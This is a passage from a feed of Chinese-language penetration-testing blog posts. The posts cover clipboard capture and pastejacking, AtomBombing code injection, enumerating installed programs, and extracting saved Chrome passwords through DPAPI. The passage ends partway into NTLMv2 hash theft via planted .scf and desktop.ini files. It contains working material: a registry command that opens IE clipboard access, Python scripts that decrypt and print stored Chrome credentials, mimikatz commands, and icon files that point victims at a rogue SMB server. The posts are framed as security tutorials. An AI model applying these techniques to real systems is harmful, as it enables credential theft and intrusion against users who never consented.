0; } 成功读取剪贴板内容，执行如下图 注： 也可以模拟键盘输入Ctrl+V，获得剪贴板内容 0x05 利用思路 1、实时捕获剪贴板内容渗透测试中，在取得系统控制权限后，会尝试读取用户的剪贴板内容，获得有价值的信息 而实际利用上，最好能够实时捕获剪贴板的内容，配合键盘记录，能够全面监控用户的登录输入内容 在程序实现上，可以加一个循环判断，如果剪贴板内容改变，就记录下来 (1) 使用c++读取当前系统的剪贴板信息代码参考上节内容，加入循环判断，写入文件的功能，代码暂略 (2) 使用powershell读取当前系统的剪贴板信息参考地址： https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-ClipboardContents.ps1 测试如下图 2、Pastejacking用作钓鱼网站，欺骗用户复制网址中的一段内容，劫持copyTextToClipboard事件，在复制的内容中加入恶意代码 复制内容echo &quot;not evil&quot;，实际剪贴板获得的内容为echo &quot;evil&quot; 测试如下图 3、修改配置允许IE浏览器读取剪贴板内容页面内容： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;script type=&quot;text/javascript&quot;&gt; var content = clipboardData.getData(&quot;Text&quot;); if (content!=null) { document.write(content); } else { document.write(&#39;No text found in clipboard.&#39;); } &lt;/script&gt; &lt;/html&gt; 用户通过IE浏览器访问，默认情况下会弹框提示是否允许此网页访问剪贴板 如下图 选择允许访问，网页获得剪贴板内容，如下图 注： Chrome、Firefox浏览器不允许通过getData访问用户的剪贴板内容 如果获得了用户系统的权限，可以修改IE配置，允许网页访问剪贴板 修改方式如下： Internet选项 -&gt; 安全 -&gt; 自定义级别 设置 -&gt; 脚本 -&gt; 允许对剪贴板进行编程访问 -&gt; 启用 如下图 对应注册表键值HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3下的1407 0表示允许 1表示提示 3表示禁止 修改注册表设置允许访问剪贴板的命令为： REG ADD &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3&quot; /v 1407 /t REG_DWORD /d 00000000 /f 重启IE浏览器后，配置生效 访问网页自动获得剪贴板内容，如下图 0x06 小结 本文介绍了Windows系统下剪贴板在渗透测试中的相关利用技巧，通过实例演示后渗透阶段的利用方法 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[AtomBombing利用分析]]></title>
    <url>%2Fposts%2F6ec06a36.html</url>
    <content type="text"><![CDATA[0x00 前言 2016年10月，网络安全公司EnSilo的研究团队公开了一个支持所有Windows系统的代码注入方法，将其命名为AtomBombing。据说该方法能够绕过大多数的安全软件，并且利用的系统缺陷很难被修复。 于是，本文将要根据开源代码和资料，学习原理，测试功能，分析利用思路，总结防御方法 学习资料： https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows 作者：Tal Liberman POC： https://github.com/BreakingMalwareResearch/atom-bombing/ 0x01 简介 本文将要介绍以下内容： AtomBombing实现方法 关键技术 防御思路 0x02 基础知识 1、Atom Table是一个存储字符串和相应标识符的系统定义表 应用程序将一个字符串放入一个Atom表中，并接收一个16位整数(WORD)作为标识(称为Atom)，可通过该标识访问字符串内容，实现进程间的数据交换 分类：(1) Global Atom Table 所有应用程序可用 当一个进程将一个字符串保存到Global Atom Table时，系统生成一个在系统范围内唯一的atom，来标示该字符串。在系统范围之内所有的进程都可以通过该atom(索引)来获得这个字符串,从而实现进程间的数据交换 (2) Local Atom Table 只有当前程序可用，相当于定义一个全局变量，如果程序多次使用该变量，使用Local Atom Table仅需要一次内存操作 参考资料： https://msdn.microsoft.com/en-us/library/ms649053 常用API：添加一个Global Atom： ATOM WINAPI GlobalAddAtom(_In_ LPCTSTR lpString); 删除一个Global Atom： ATOM WINAPI GlobalDeleteAtom(_In_ ATOM nAtom); 查找指定字符串对应的Global Atom： ATOM WINAPI GlobalFindAtom(_In_ LPCTSTR lpString); 获取指定atom对应的字符串： UINT WINAPI GlobalGetAtomName( _In_ ATOM nAtom, _Out_ LPTSTR lpBuffer, _In_ int nSize ); 注： 使用实例可参考如下连接： https://github.com/sinmx/Windows2K/blob/661d000d50637ed6fab2329d30e31775046588a9/private/windows/base/client/tatom.c 2、APC注入APC全称asynchronous procedure call，即异步过程调用 APC注入原理：当线程处于警戒状态时，会检查APC队列，如果APC队列被插入函数指针，该函数将会得到执行 APC注入细节：(1) 当线程调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx，WaitForMultipleObjectsEx或者WaitForSingleObjectEx函数时，会切换到警戒状态(alertable state) 注： 警戒状态可参考： https://msdn.microsoft.com/en-us/library/windows/desktop/aa363772(v=vs.85).aspx (2) 当线程进入警戒状态时，会循环检查线程中的APC队列，如果APC队列中存在函数指针，那么就会调用该函数 (3) 使用QueueUserAPC函数向APC队列插入函数指针Loadlibrary()，实现加载DLL (4) 注入成功后，警戒状态结束，程序继续运行，有可能造成程序不稳定，导致程序崩溃 (5) 如果没有删除APC队列，不能反复注入同一函数 (6) 使用APC注入，需要目标进程中至少有一个线程处于警戒状态或者能够进入警戒状态，否则无法实现APC注入 注： 大部分系统进程都满足条件，支持APC注入 可供参考的APC注入代码： https://github.com/3gstudent/Inject-dll-by-APC 3、shellcode在漏洞利用中，shellCode是指输入到存在漏洞的程序中的代码 相当于一个二进制代码框架，最终会将程序的流程跳转到payload 4、payload主要功能代码(常见的如下载执行、反弹shell、新建用户等)，包含在shellCode中 0x03 实现方法 1、将任意数据写入目标进程地址空间中的任意位置(Write-What-Where)通过读写atom向目标进程传递shellcode 自身进程通过GlobalAddAtom将shellcode添加到Global Atom Table中，目标进程调用GlobalGetAtomName即可从Global Atom Table中获取shellcode 所以接下来的关键是如何使目标进程调用GlobalGetAtomName Tal Liberman的思路是通过APC注入，使目标进程调用GlobalGetAtomName 但是这里遇到了一个难题，QueueUserAPC函数只能向目标进程传入一个参数，而GlobalGetAtomName需要三个参数 于是Tal Liberman调试了QueueUserAPC函数，发现通过NtQueueApcThread函数能够传递三个参数 该问题得到解决 2、执行shellcode目标进程调用GlobalGetAtomName从Global Atom Table中获取shellcode后，需要先保存shellcode再执行 第一种实现方法： 找到一段RWX的内存存储并执行 不通用，目前的系统保护机制很难找到这样的内存空间 第二种实现方法： 调用VirtualAllocEx分配一段内存 常用方法 注: 其他常见方法如通过VirtualProtect将shellcode的内存属性设置为可读可写可执行，然后跳到shellcode继续执行在这里的效果并不好，因为需要考虑使用QueueUserAPC函数传入参数的问题 所以Tal Liberman尝试了第三种方法： 找到一段RW的内存写入数据，构造ROP链实现shellcode的执行 寻找一段RW的内存并不难，Tal Liberman选择了KERNELBASE数据段后未使用的空间 ROP链实现了以下功能： 申请RWX内存 将shellcode从RW内存处拷贝到RWX内存储 执行 注： 在ROP链的构造上，Tal Liberman提供了自己的思路，尽可能简化ROP链，优化思路值得学习 3、恢复执行注入后需要恢复目标进程的执行，使用未公开的函数ZwContinue 0x04 实际测试 测试系统： Win7 x86 安装python，安装pefile(easy_install pefile) 编译生成AtomBombing.exe、AtomBombingShellcode.exe和AtomBombingShellcode.h 注： AtomBombingShellcode.h由\AtomBombingShellcode\Scripts\Post_Link.py生成，可在AtomBombingShellcode工程中的后期生成事件中查看具体参数，如下图 启动chrome.exe，执行AtomBombing.exe，注入成功，如下图 补充： Windows 8.1 update 3和Windows 10添加了一个新的保护机制CFG(Control Flow Guard),CFG的绕过可参考如下链接： https://blog.ensilo.com/atombombing-cfg-protected-processes 0x05 利用分析 综合公开资料和实际测试，可以将AtomBombing理解为一个APC注入的升级版： 利用Atom Table传递shellcode，通过NtQueueApcThread实现APC注入，shellcode采用构造ROP链的方式，实现了申请内存、写入payload(弹出计算器)并执行的功能 Atom Table支持Windows全平台，并且短期内该功能不会被取消，也不存在修复措施，所以可以在某种程度上理解为不存在修复AtomBombing的补丁 但是，想实现AtomBombing的利用，需要综合考虑多个问题(如获取处于警戒状态的线程、通过NtQueueApcThread传入参数、寻找RX内存，构造ROP链等)，利用门槛较高 并不适用于所有进程(目标进程中至少有一个线程处于警戒状态或者能够进入警戒状态) 能绕过部分杀毒软件，但不能绕过所有的杀毒软件(使用NtQueueApcThread进行注入) 0x06 检测防御 将AtomBombing理解为APC注入的升级版，所以参照APC注入的防御方法即可，攻击者首先需要获得系统的执行权限，并找到符合条件的进程 检测： 监控NtQueueApcThread函数的调用 0x07 小结 本文介绍了AtomBombing的实现思路和关键技术，经过实际测试，得出最终结论，AtomBombing是一种新的DLL注入方法，可以理解为一个APC注入的升级版： 利用Atom Table传递shellcode，通过NtQueueApcThread实现APC注入，shellcode采用构造ROP链的方式，实现了申请内存、写入payload(弹出计算器)并执行的功能 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透基础——获得当前系统已安装的程序列表]]></title>
    <url>%2Fposts%2F1620c8.html</url>
    <content type="text"><![CDATA[0x00 前言 最近遇到了一个有趣的问题： 我在尝试使用wmi获取当前系统已安装的程序列表时，并不能获得完整的列表。于是做了进一步研究，找出错误原因，改变思路，完成目标。 本文是一篇介绍基础知识的文章，用来解决基本的问题。 0x01 简介 本文将要介绍以下内容： 通过wmi获取当前系统已安装的程序列表 wmi查询结果不完整的原因 获取完整程序列表的实现思路 0x02 获取当前系统已安装的程序列表 1、使用powershell调用wmi代码如下： Get-WmiObject -class Win32_Product 对输出结果进行过滤，只显示程序名称，代码如下： Get-WmiObject -class Win32_Product |Select-Object -Property name 获得结果如下图 2、使用wmic调用wmi代码如下： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product 对输出结果进行过滤，只显示程序名称，代码如下： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name /FORMAT:table 获得结果如下图 3、使用WMI Explorer调用wmi下载地址： https://wmie.codeplex.com/releases/view/135794 界面化的WMI查询工具，可用来查询wmi支持的类，是研究wmi的好工具 首先点击Connect连接本机 选中ROOT\CIMV2 -&gt; Query 输入查询命令： SELECT * FROM Win32_Product 获得结果如下图 4、通过控制面板查询已安装的程序控制面板 -&gt; 程序 -&gt; 程序和功能 发现部分程序通过wmi查询无法获得，例如Google Chrome，对比结果如下图 0x03 wmi查询结果不完整的原因 通过WMI查询Win32_Product只能获得特定的程序列表 这些程序有一个共同的特征： 安装包由Windows Installer制作，安装过程中调用Windows Installer服务进行安装 说明： Microsoft Windows Installer： Windows 操作系统的一个组件，是安装和卸载软件的标准基础。 Windows Installer服务： 添加、修改和删除作为Windows Installer程序包提供的应用程序。 除了Microsoft Windows Installer，制作安装包还可使用EasySetup、Setup2Go、Advanced Installer、Qt installer framework和WinRAR Chrome的在安装过程中不会调用Microsoft Windows Installer组件，所以通过WMI查询Win32_Product无法找到Chrome 0x04 获取完整程序列表的实现思路 我们知道，通过控制面板 -&gt; 程序 -&gt; 程序和功能获取的程序列表比较完整，该列表对应注册表键值： HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\ 每个子健代表列表中的一个程序 所以，可以通过枚举注册表键值的方法获得完整程序列表 值得注意的是64位系统下，注册表存在重定向的问题，也会影响程序列表的显示 32位程序列表对应注册表键值HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ 64位程序列表对应注册表键值HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\ 注： 这个问题在之前的文章《关于32位程序在64位系统下运行中需要注意的重定向问题》进行过整理 编写powershell脚本实现枚举注册表，获得完整的程序列表 关键代码： 1、枚举指定注册表项下的子项dir Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -Name 如下图 2、查询指定注册表项的注册表键值(Get-ItemProperty -Path &quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{4F3742E0-700E-431D-BF19-5B27ED98E8F1}&quot;).DisplayName 如下图 3、加入foreach循环实现枚举$RegPath = &quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\&quot; $QueryPath = dir $RegPath -Name foreach($Name in $QueryPath) { (Get-ItemProperty -Path $RegPath$Name).DisplayName } 4、加入判断系统位数，自动判断注册表重定向完整代码可参考如下地址： https://github.com/3gstudent/ListInstalledPrograms 0x05 补充 通常，已安装的程序会创建快捷方式，所以，尝试枚举快捷方式文件也能获得完整的程序列表 通过wmic获取所有快捷方式： wmic PATH Win32_ShortcutFile get name /FORMAT:table 0x06 小结 本文介绍了通过wmi无法获得当前系统已安装程序完整列表的原因，编写powershell脚本，通过枚举注册表项，实现获得程序完整列表。作为一篇介绍基础知识的文章，希望能给新人带来启发。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——离线导出Chrome浏览器中保存的密码]]></title>
    <url>%2Fposts%2Fc7f0a7a3.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《渗透技巧——导出Chrome浏览器中保存的密码》介绍了导出Chrome浏览器密码的原理和利用方法，文末留下一个问题： 如果只获得了用户的ntlm hash，能否导出Chrome浏览器保存的明文密码呢？ 该部分的参考资料较少，而想要解答这个问题，需要了解加解密的原理，所以本文尝试对该部分内容做介绍，得出最终结论 0x01 简介 本文将要介绍以下内容： DPAPI简介及相关概念 DPAPI加解密流程 离线导出原理 离线导出方法 得出最终结论 0x02 DPAPI简介 本节内容参考自如下链接，加入个人理解： https://msdn.microsoft.com/en-us/library/ms995355.aspx https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28 DPAPI全称Data Protection Application Programming Interface 作为Windows系统的一个数据保护接口被广泛使用 主要用于保护加密的数据，常见的应用如： EFS文件加密 存储无线连接密码 Windows Credential Manager Internet Explorer Outlook Skype Windows CardSpace Windows Vault Google Chrome 使用简单，加密使用函数CryptProtectData，解密使用函数CryptUnprotectData即可，系统在后台自动完成其他复杂的加解密操作 CryptProtectData的说明可参考： https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx CryptUnprotectData的说明可参考： https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx 专有名词DPAPI blob：一段密文，可使用Master Key对其解密 结构如下图 该图引用自https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28 Master Key：64字节，用于解密DPAPI blob 通过用户登录密码、SID和16字节随机数加密后保存在Master Key file中 Master Key file：二进制文件，可使用用户登录密码对其解密，获得Master Key 包含以下五个部分： Header and system information User’s Master Key Local backup encryption key Unique CREDHIST file identifier Domain Master Key backup 位于固定位置： %APPDATA%\Microsoft\Protect\%SID% 例如： C:\Users\a\AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001 包含文件329c4147-0011-4ad6-829d-e32dcbd1bbd7(系统文件，隐藏属性) 无法直接查看 可通过mimikatz对其解析，命令如下： mimikatz.exe log &quot;dpapi::masterkey /in:&quot;329c4147-0011-4ad6-829d-e32dcbd1bbd7&quot; 输出如下： mimikatz(commandline) # dpapi::masterkey /in:329c4147-0011-4ad6-829d-e32dcbd1bbd7 **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {329c4147-0011-4ad6-829d-e32dcbd1bbd7} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 9917a47f1949226e4e8c5b8a3aaf4808 rounds : 00000ce4 - 3300 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : cf2634535384431da063fd9a240ab575d13dc1daee8ea545d5c9a0628fa5cc63cf825b3b24642b3d7fe98a3703c1e7cdc7e49132a017e3e45fe34f8512fdb8b224e5c30a754683ff6e098a94a1ee396c026a6022323aff6903b3cdad1185a719accadb924f80482dcf426996fb3f662323d7c9e885504f39baa080d63eaddd2621171b3d780cef9c47d9a0b79a4afc20 [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 57fb6f4228e9ca7d686c7f174f1691b0 rounds : 00000ce4 - 3300 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 1ae34b8395375465871a999c0d04365cc5089cad4bea139344ecb8f9cf0da1abe5d7b096e9594506a0d8c772469b1f81118d608823e2be33020a8a86bb6d190d61865d270e299dfec9aca011531313dd2a2cd6dc4a53adc77b17a410d15ac4c6b11b3450d1c9739e869f67a8278d60ee [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {58680bc7-055e-4728-ab96-c34d64c565f2} 0x03 DPAPI解密思路 1、使用用户登录密码解密Master Key file，获得Master Key固定位置： %APPDATA%\Microsoft\Protect\%SID%下往往有多个Master Key file 这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除) %APPDATA%\Microsoft\Protect\%SID%下存在一个固定文件Preferred，包含最后一个Master Key file的名称和创建时间，文件结构如下： typedef struct _tagPreferredMasterKey { GUID guidMasterKey; FILETIME ftCreated; } PREFERREDMASTERKEY, *PPREFERREDMASTERKEY; 2、使用Master Key解密DPAPI blob，获得明文0x04 离线导出Chrome浏览器中保存的密码 1、获得DPAPI blobDPAPI blob位于SQLite数据库文件Login Data的password段，如下图 使用python脚本对其读取并保存到文件中，代码如下： from os import getenv import sqlite3 import binascii conn = sqlite3.connect(&quot;Login Data&quot;) cursor = conn.cursor() cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;) for result in cursor.fetchall(): print (binascii.b2a_hex(result[2])) f = open(&#39;test.txt&#39;, &#39;wb&#39;) f.write(result[2]) f.close() 2、解密Master Key获得明文使用工具Windows Password Recovery，下载地址： https://www.passcape.com/index.php?section=downloads&amp;category=28 选择Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob 设置DPAPI blob file指向保存DPAPI blob的文件test.txt，如下图 设置Master Key file指向待破解的Master Key file，如下图 接下来输入用户登录密码 获得明文，如下图 成功解密 使用ChromePass对结果进行验证 ChromePass下载地址： http://www.nirsoft.net/utils/chromepass.html 参数说明： /external &lt;User Profile Path&gt; &lt;Last Log-On Password&gt; 命令如下： ChromePass.exe /external c:\1\2\3\ test123 如下图 0x05 最终结论 1、无法自动定位Master Key file如果用户sid文件夹下包含多个Master Key file，使用Windows Password Recovery尝试解密时，需要逐个测试，也可通过读取文件Preferred的前16字节获得对应的Master Key file 使用ChromePass不存在这个问题，填入文件上级目录的路径即可 2、无法使用用户登录密码的NTLM hash解密Master Key目前版本的DPAPI在设计上考虑到了这个隐患，使用SHA1算法(NTLM hash使用MD4加密) 所以说，无法使用用户登录密码的NTLM hash解密Master Key 3、DPAPI很安全，符合密码安全性的要求以上测试基于已获得了目标系统的访问权限，也就是说目标系统已经变得不安全 对于一个未获得访问权限的Windows系统，目前使用DPAPI不会造成密码被破解的问题 0x06 小结 本文通过分析DPAPI加解密流程，得出结论： 使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码 0x07 补充 离线导出Chrome浏览器中保存的密码还可以通过lsass进程提取出Master Key进行解密，不需要获得用户的明文密码，详情可参考《渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码》 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——导出Chrome浏览器中保存的密码]]></title>
    <url>%2Fposts%2Fb8ea7158.html</url>
    <content type="text"><![CDATA[0x00 前言 在后渗透阶段，获得权限后需要搜集目标系统的信息。信息越全面，越有助于进一步的渗透。对于Windows系统，用户浏览器往往包含有价值的信息。 在之前的文章《本地密码查看工具LaZagne中的自定义脚本开发》曾介绍过利用LaZagne导出多个浏览器密码的方法。 本文将要针对Chrome浏览器，介绍具体的导出原理和利用方法，解决一个实际问题： 如何导出另一系统下Chrome浏览器中保存的密码？ 0x01 简介 本文将要介绍以下内容： Chrome浏览器保存密码的方式 如何导出Chrome浏览器中保存的密码 常用方法的限制 如何导出另一系统下Chrome浏览器中保存的密码 0x02 Chrome浏览器保存密码的方式 正常用户在访问网站时，可选择使用Chrome浏览器保存登录的用户密码，用于下次登录的时候Chrome自动填写登录密码，如下图 在Chrome中可以查看保存的登录密码(需要提供用户口令)，如下图 Chrome中保存的密码先被二次加密，然后被保存在SQLite数据库文件中，位置如下： %LocalAppData%\Google\Chrome\User Data\Default\Login Data 实际测试：测试系统： Win7x86 Chrome版本： 63.0.3239.132 定位SQLite数据库文件，位于C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Login Data 使用工具读取数据库文件，测试工具： SQLiteStudio 下载地址： https://sqlitestudio.pl/index.rvt 注： SQLiteStudio开源，特点是支持查看十六进制数据(SQLiteSpy不支持查看十六进制数据) 成功读取数据库文件保存的信息，但password段无法显示，如下图 选择Form view，查看十六进制格式，获得二次加密后的用户密码，如下图 注： 如果Chrome正在运行，无法使用SQLiteStudio打开数据库文件Login Data，可将该文件复制后再打开 0x03 导出Chrome浏览器中保存的密码 首先，编写程序实现读取SQLite数据库文件，这里选择使用python实现 开源代码很多，所以这里只给出一个示例 from os import getenv import sqlite3 import binascii conn = sqlite3.connect(getenv(&quot;APPDATA&quot;) + &quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;) cursor = conn.cursor() cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;) for result in cursor.fetchall(): print (binascii.b2a_hex(result[2])) 获得二次加密的用户密码，如下图 参考Chromium开源代码，找到Chrome做二次加密的方法： 通过Windows API CryptProtectData()实现 参考加密代码： https://github.com/scheib/chromium/blob/eb7e2441dd8878f733e43799ea77c2bab66816d3/chrome/browser/password_manager/password_store_win_unittest.cc#L107 CryptProtectData()的说明可参考： https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx 获得关键信息： (1)对应解密函数为CryptUnprotectData参考地址： https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx (2)只有与加密数据的用户具有相同登录凭据的用户才能解密数据也就是说，只能在当前用户的凭据下解密数据 解密的开源代码也有很多，这里给出一个示例： from os import getenv import sqlite3 import win32crypt import binascii conn = sqlite3.connect(getenv(&quot;APPDATA&quot;) + &quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;) cursor = conn.cursor() cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;) for result in cursor.fetchall(): password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1] print password 注： 调用win32crypt.CryptUnprotectData需要安装pywin32 下载地址： http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe 执行后，还原用户密码，如下图 注： 如果Chrome正在运行，无法查询数据库文件Login Data，显示sqlite3.OperationalError: database is locked 综上，在实际导出的过程中，如果Chrome正在运行，需要先复制数据库文件，再尝试解密 0x04 如何导出另一系统下Chrome浏览器中保存的密码 参照CryptProtectData()的说明，地址如下： https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx “Usually, the only user who can decrypt the data is a user with thesame logon credentials as the user who encrypted the data.In addition,the encryption and decryption must be done on the same computer. “ 是否可以断定，无法在另一系统下导出Chrome浏览器中保存的密码呢？ 答案是否定的 Chrome密码还原工具chromepass提供了一个特别的功能： Reading ChromePass passwords from external drive chromepass下载地址： http://www.nirsoft.net/utils/chromepass.html 说明如下： “you can also read the passwords stored by Chrome Web browser from anexternal profile in your current operating system or from anotherexternal drive” 也就是说，使用chromepass能够导出当前系统下另一用户的Chrome密码 操作界面如下图 既然如此，如果获得了另一系统下的相关配置文件，能否导出Chrome浏览器中保存的密码呢？ 当然可以 解密需要获得三部分内容： 加密密钥(即Master Key文件)，位于%appdata%\Microsoft\Protect下对应sid文件夹下的文件 数据库文件Login Data 用户明文的密码，用于解密加密密钥 由于chromepass程序的设计问题，以上文件需要组成特定格式，子目录格式如下： \AppData\Local\Google\Chrome\User Data\Default\Login Data \AppData\Roaming\Microsoft\Protect{sid}}\下保存key文件 注： {sid}必须同原系统的对应 eg. \AppData\Local\Google\Chrome\User Data\Default\Login Data \AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001\329c4147-0011-4ad6-829d-e32dcbd1bbd7 如下图 使用chromepass选择该目录，填入用户明文密码，如下图 成功解密，如下图 补充： chromepass也可在命令行下使用 0x05 开源工具 解密当前系统下Chrome浏览器中保存的密码，可供参考的工具： 命令行工具Chrome Password Dump，下载地址： http://securityxploded.com/chrome-password-dump.php powershell实现的工具： https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1 python实现代码，可供参考的开源代码： from os import getenv import sqlite3 import win32crypt import binascii conn = sqlite3.connect(getenv(&quot;APPDATA&quot;) + &quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;) cursor = conn.cursor() cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;) for result in cursor.fetchall(): password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1] if password: print &#39;Site: &#39; + result[0] print &#39;Username: &#39; + result[1] print &#39;Password: &#39; + password else: print &quot;no password found&quot; 0x06 小结 本文介绍了导出Chrome浏览器密码的原理和利用方法，成功解决一个实际问题： 通过加密密钥文件和用户明文密码，能够导出另一系统下Chrome浏览器中保存的密码 如果只获得了用户密码ntlm hash，能否导出呢？ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash]]></title>
    <url>%2Fposts%2Ffa8a8ff3.html</url>
    <content type="text"><![CDATA[0x00 前言 在文章《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》介绍了在服务器上通过Windows命令行抓包获取连接文件服务器的NTLMv2 Hash的方法，解决了一个有趣的问题： 如果获得了内网一个文件服务器的权限，如何获得更多用户的口令？ 本文将换一种实现方式，通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。 0x01 简介 本文将要介绍以下内容： 添加scf文件强制用户访问伪造的文件服务器 修改文件夹图标强制用户访问伪造的文件服务器 文件夹图标后门 防御思路 0x02 实现思路 利用SMB协议的特性，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录 在用户访问文件服务器时，如果我们能够欺骗用户访问伪造的文件服务器，并在伪造的文件服务器上抓包，那么就能获得用户本机的NTLMv2 Hash 所以关键是如何欺骗用户访问伪造的文件服务器，同时又保证隐蔽 欺骗用户访问伪造的文件服务器的方法有多种(钓鱼方式暂略)，那么有没有当用户打开文件共享时，自动访问伪造文件服务器的方法呢？当然是有的，接下来主要介绍两种实现方式 0x03 添加scf文件强制用户访问伪造的文件服务器 其他文章对该方法已经有过介绍，参考资料： https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ https://xianzhi.aliyun.com/forum/topic/1624 这里简要介绍一下原理 scf文件： SCF文件是”WINDOWS资源管理器命令”文件，是一种可执行文件,该类型文件由Windows Explorer Command解释，标准安装 包含三种类型： Explorer.scf(资源管理器) Show Desktop.scf(显示桌面) View Channels.scf（查看频道） 格式示例： [Shell] Command=2 IconFile=explorer.exe,3 [Taskbar] Command=ToggleDesktop IconFile属性支持UNC路径，也就是说，可以指定文件服务器上的某个文件，例如IconFile=\\192.168.62.130\test\explorer.exe,3 特别的地方： 使用Explore.exe打开包含该文件的路径时，由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，如果图标位于文件服务器，就会访问该文件服务器 直观理解： 打开某一文件夹，该文件夹下面包含scf文件，scf文件的IconFile属性指向文件服务器，本机会自动访问该文件服务器，在访问过程中，默认先使用本机的用户名和密码hash尝试登录。如果文件服务器抓取数据包，就能够获得NTLMv2 Hash 实际测试：正常文件服务器IP: 192.168.62.139 伪造文件服务器IP： 192.168.62.130 客户端IP： 192.168.62.135 1、正常文件服务器共享目录下添加文件test.scf，内容如下：[Shell] Command=2 IconFile=\\192.168.62.130\test\test.ico [Taskbar] Command=ToggleDesktop 注： IconFile指向伪造文件服务器，test.ico不存在 2、在伪造文件服务器上使用wireshark进行抓包3、客户端访问正常文件服务器4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash如下图 构造特定格式username::domain:challenge:HMAC-MD5:blob，使用Hashcat破解即可 具体破解方法可参考文章： 《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》 《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》 经过实际测试，我们可以看到，利用的关键是要在文件服务器上添加scf文件，等待用户访问 那么，有没有更为隐蔽的方法呢？ 0x04 修改文件夹图标强制用户访问伪造的文件服务器 参考scf文件的利用原理，需要找到可以指定IconFile属性的特殊文件 经过寻找，我找到了一个合适的方法： 修改文件夹图标强制用户访问伪造的文件服务器 修改文件夹图标的方法：选中文件夹-右键-属性-自定义-更改图标，如下图 更好后，在文件夹子目录生成文件desktop.ini，格式如下： [.ShellClassInfo] IconResource=C:\Windows\system32\SHELL32.dll,3 [ViewState] Mode= Vid= FolderType=Generic 尝试将IconResource属性替换为UNC路径，路径为IconResource=\\192.168.62.130\test\SHELL32.dll,3 测试成功 实际测试：正常文件服务器IP: 192.168.62.139 伪造文件服务器IP： 192.168.62.130 客户端IP： 192.168.62.135 1、正常文件服务器共享目录的test文件夹下添加文件desktop.ini，内容如下：[.ShellClassInfo] IconResource=\\192.168.62.130\test\SHELL32.dll,4 [ViewState] Mode= Vid= FolderType=Generic 注： IconResource指向伪造文件服务器，SHELL32.dll不存在 2、在伪造文件服务器上使用wireshark进行抓包3、客户端访问正常文件服务器4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash如下图 通过这种方式，相比于scf文件，隐蔽性更高 0x05 文件夹图标后门 